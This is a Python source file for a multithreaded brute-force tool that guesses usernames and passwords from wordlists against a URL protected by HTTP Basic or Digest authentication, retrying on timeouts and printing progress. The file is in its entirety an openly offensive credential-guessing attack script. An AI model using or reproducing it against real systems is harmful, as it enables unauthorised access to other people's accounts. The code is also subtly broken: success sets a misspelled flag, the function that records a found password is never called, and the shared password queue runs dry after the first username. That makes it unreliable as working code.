import requests
import threading
import queue
import time
import os

from utils import *
from typing import List, Type, Union
from requests.auth import HTTPBasicAuth, HTTPDigestAuth
from urllib3.exceptions import HTTPError


class HTTPBrute:
    _SUCCESS_SCODE = 200
    _LOG_STATUS_INTV = 30  # in seconds

    def __init__(self,
                 target_url: str,
                 user_list: List[str],
                 pass_list: List[str],
                 sleep: int,
                 workers_count: int,
                 timeout: int):

        self._usernames = user_list
        self._passwords_queue = self._generate_queue(pass_list)
        if len(self._usernames) == 0 or self._passwords_queue.empty():
            self._terminate(f"username list [size {len(self._usernames)}] "
                            f"and password list [size {self._passwords_queue.qsize()}] "
                            f"cannot be empty!")
        else:
            print_success(f"loaded {len(self._usernames)} usernames and "
                          f"{self._passwords_queue.qsize()} passwords")

        self._url = target_url
        self._session = requests.Session()
        self._workers_count = workers_count
        self._req_timeout = timeout
        self._sleep_intv = sleep
        self._auth_cls: Union[Type[HTTPBasicAuth], Type[HTTPDigestAuth]] = self._get_auth_type()

        self._start = float()
        self._finished = False
        self._last_status_log = float()
        self._results = dict()

    def _make_request(self, *args, **kwargs):
        """
        don't pass url as argument -> less overhead
        """
        return self._session.get(self._url, timeout=self._req_timeout, *args, **kwargs)

    @staticmethod
    def _generate_queue(wordlist: List[str]) -> queue.Queue[str]:
        wq = queue.Queue()
        for word in wordlist:
            wq.put(word)
        return wq

    def _worker_routine(self, username: str):
        while not self._passwords_queue.empty() and not self._finished:
            passw = self._passwords_queue.get()
            auth = self._auth_cls(username, passw)
            try:
                response = self._make_request(auth=auth)
                if response.status_code == HTTPBrute._SUCCESS_SCODE:
                    self.finished = True
                now = time.time()
                if now - self._last_status_log > HTTPBrute._LOG_STATUS_INTV and not self._finished:
                    print_info(f"passwords left -> {self._passwords_queue.qsize()} | "
                               f"elapsed time -> {round(time.time() - self._start, 2)}[s]")
            except (requests.exceptions.ConnectionError, requests.exceptions.ConnectTimeout,
                    requests.exceptions.ReadTimeout, HTTPError):
                print_error(f"connection timeout for password '{passw}', putting back in queue...")
                self._passwords_queue.put(passw)
                continue
            except requests.exceptions.TooManyRedirects:
                continue
            except Exception as exc:
                self._terminate(f"an unhandled exception occurred for one of the workers -> {exc}")
            finally:
                if self._sleep_intv:  # don't call `sleep()` if interval==0 to avoid context switch overhead
                    time.sleep(self._sleep_intv)

    def log_success(self, user: str, passwd: str):
        self._finished = True
        self._results[user] = passwd

    def _get_auth_type(self) -> Union[Type[HTTPBasicAuth], Type[HTTPDigestAuth]]:
        try:
            res = self._make_request()
            auth_header = res.headers.get('WWW-Authenticate')
            if auth_header:
                if 'basic' in auth_header.lower():
                    return HTTPBasicAuth
                elif 'digest' in auth_header.lower():
                    return HTTPDigestAuth
                else:
                    print_error(f"auth header '{auth_header}' is not of type basic / digest!")
                    self._terminate(f"unsupported auth-type: {auth_header}")
            else:
                print_error(f"auth header is missing, please check the url")
                self._terminate(f"missing auth header ('WWW-Authenticate')")
        except Exception as exc:
            self._terminate(f"unable to determine auth-type, exception - {exc}")

    def run(self):
        try:
            for user in self._usernames:
                print_info(f"setting up {self._workers_count} workers for username -> {user}")
                threads = list()
                self._start = time.time()
                for passw in range(self._workers_count):
                    t = threading.Thread(target=self._worker_routine, args=(user,))
                    t.start()
                    threads.append(t)

                for worker in threads:
                    worker.join()
                if user in self._results:
                    print_success(f"username {user} found password -> {self._results[user]}")
                else:
                    print_success(f"username {user} found failed to find password")
        except KeyboardInterrupt:
            self._terminate("user request")
        except Exception as exc:
            self._terminate(f"an exception occurred from main runner -> {exc}")

    @staticmethod
    def _terminate(reason):
        """
        happens on error / user interrupt
        """
        print_error(f"terminating, reason -> {reason}")
        os.kill(os.getpid(), 9)


if __name__ == "__main__":
    parser = arg_parser.get_argument_parser()
    arguments = parser.parse_args()

    word_lists = dict()
    for l_args in [("user", "user_list"), ("pass", "pass_list")]:
        single_word, wordlist_path = tuple(getattr(arguments, arg) for arg in l_args)
        if not has_one([single_word, wordlist_path]):
            print(f"Exactly one of the following args should be used -> {l_args}")
            exit(-1)
        word_lists[l_args[1]] = load_wordlist(wordlist_path) if wordlist_path else [single_word]

    HTTPBrute(target_url=arguments.target_url,
              workers_count=arguments.workers,
              timeout=arguments.timeout,
              sleep=arguments.sleep,
              **word_lists).run()
